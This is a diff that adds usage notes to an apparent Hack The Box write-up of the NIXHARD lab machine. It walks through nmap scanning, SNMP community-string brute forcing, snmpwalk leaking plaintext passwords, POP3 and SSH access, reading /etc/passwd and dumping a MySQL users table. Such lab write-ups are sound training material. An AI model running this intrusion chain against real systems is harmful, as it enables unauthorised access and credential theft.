@@ -45,6 +45,7 @@ NIXHARD is a Linux server functioning as an MX (mail exchange) and management se
 ```bash
 sudo nmap -sV -sS 10.129.2.65
 ```
+> SYN stealth scan with service version detection against the target's default TCP ports. Swap `10.129.2.65` for your target IP.
 
 **Explanation:**
 - `-sV`: Service version detection
@@ -91,6 +92,7 @@ Several approaches were attempted and failed before discovering the correct atta
 ```bash
 sudo nmap -sU -p 161 -sV 10.129.2.65
 ```
+> UDP scan of SNMP port 161 only, with version detection — must be run over a UDP VPN or results are unreliable. Swap `10.129.2.65` for your target IP.
 
 **Explanation:**
 - `-sU`: UDP scan
@@ -117,6 +119,7 @@ PORT    STATE SERVICE VERSION
 ```bash
 onesixtyone 10.129.2.65 -c ~/SecLists/Discovery/SNMP/snmp.txt
 ```
+> Brute-forces the SNMP community string using a wordlist (`-c`). Swap `10.129.2.65` for your target IP and point `-c` at your SNMP community wordlist.
 
 **Explanation:**
 - `onesixtyone`: Fast SNMP community string scanner
@@ -137,6 +140,7 @@ Despite the server advertising SNMPv3, it also accepted SNMPv2c queries — a co
 ```bash
 snmpwalk -v2c -c backup 10.129.2.65
 ```
+> Dumps the entire SNMP MIB tree using SNMPv2c and the discovered community string — process args here leaked plaintext credentials. Swap `backup` for your community string and `10.129.2.65` for your target IP.
 
 **Explanation:**
 - `-v2c`: Use SNMP version 2c
@@ -175,6 +179,7 @@ Authentication token manipulation error
 ```bash
 telnet 10.129.2.65 110
 ```
+> Opens a raw connection to plaintext POP3 (port 110). Swap `10.129.2.65` for your target IP; use port 110 to avoid SSL errors on 995.
 
 ```
 USER tom
@@ -182,6 +187,7 @@ PASS NMds732Js2761
 LIST
 RETR 1
 ```
+> POP3 commands typed inside the telnet session: authenticate with `USER`/`PASS`, `LIST` enumerates messages, `RETR 1` reads message 1. Swap the username and password for your captured credentials.
 
 **Explanation:**
 - Connected to plaintext POP3 (port 110) to avoid SSL renegotiation errors on port 995
@@ -216,6 +222,7 @@ chmod 600 /tmp/tom_key
 # Connect using the private key
 ssh -i /tmp/tom_key tom@10.129.2.65
 ```
+> Save the recovered private key to a file, lock it down to `600` (SSH refuses world-readable keys), then authenticate with `-i`. Swap the key path, username `tom`, and `10.129.2.65` for your values.
 
 ✅ **Shell obtained as `tom` on NIXHARD**
 
@@ -225,6 +232,7 @@ ssh -i /tmp/tom_key tom@10.129.2.65
 ```bash
 cat /etc/passwd | grep -v nologin
 ```
+> Lists only interactive accounts by filtering out `nologin` service accounts — fast way to spot real login users post-shell. Run on the compromised host as-is.
 ```
 root:x:0:0:root:/root:/bin/bash
 ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
@@ -242,11 +250,13 @@ tom:x:1002:1002:,,,:/home/tom:/bin/bash
 mysql -u tom -p
 # Password: NMds732Js2761
 ```
+> Connects to the local MySQL instance reusing tom's password (`-p` prompts for it). Swap `tom` for the username and supply the matching password.
 
 **Database Enumeration:**
 ```sql
 SHOW DATABASES;
 ```
+> Run at the MySQL prompt to list all databases — first step in finding the credential store. No arguments to change.
 ```
 +--------------------+
 | Database           |
@@ -263,6 +273,7 @@ SHOW DATABASES;
 USE users;
 SHOW TABLES;
 ```
+> Selects the `users` database and lists its tables. Swap `users` for whichever database name looked interesting in `SHOW DATABASES;`.
 ```
 +-----------------+
 | Tables_in_users |
@@ -274,6 +285,7 @@ SHOW TABLES;
 ```sql
 SELECT * FROM users;
 ```
+> Dumps every row of the `users` table — the backed-up domain credentials. Swap `users` for the target table name from `SHOW TABLES;`.
 
 ✅ **HTB user credentials recovered from the `users` database!**
 
